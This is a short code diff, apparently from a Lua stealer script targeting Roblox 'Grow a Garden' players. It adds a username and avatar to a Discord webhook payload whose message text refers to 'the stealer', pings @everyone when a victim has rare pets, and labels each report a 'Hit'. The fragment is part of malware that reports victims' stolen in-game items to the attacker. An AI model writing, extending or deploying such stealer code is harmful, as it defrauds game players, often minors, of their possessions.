@@ -397,6 +397,8 @@
         end
 
         local payload = {
+            username = SCRIPT.SM,
+            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
             embeds = {{
                 title = "Grow a Garden Hit - " .. (_G.Script.SM.Config.ServerName or "Scripts.SM"),
